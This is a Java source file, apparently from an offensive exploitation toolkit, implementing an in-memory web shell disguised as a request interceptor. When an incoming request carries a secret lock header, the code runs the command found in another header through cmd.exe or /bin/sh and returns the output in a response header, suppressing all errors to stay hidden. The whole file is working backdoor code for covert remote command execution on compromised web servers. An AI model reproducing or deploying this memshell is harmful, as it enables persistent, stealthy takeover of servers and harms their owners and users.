package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
@MemShell(MemShell.Interceptor)
@MemShellFunction(MemShellFunction.Exec)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class InterceptorExec implements InvocationHandler {
    private static String HEADER;
    private static String RHEADER;
    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("preHandle")) {
            return run(args[0], args[1], args[2]);
        }
        return null;
    }

    private boolean run(Object request, Object response, Object handler) {
        try {
            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return true;
            }

            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            String result = exec((String) header);
            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
            return false;
//            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
//            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
        } catch (Throwable ignored) {
        }
        return true;
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();

        // result
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }
}
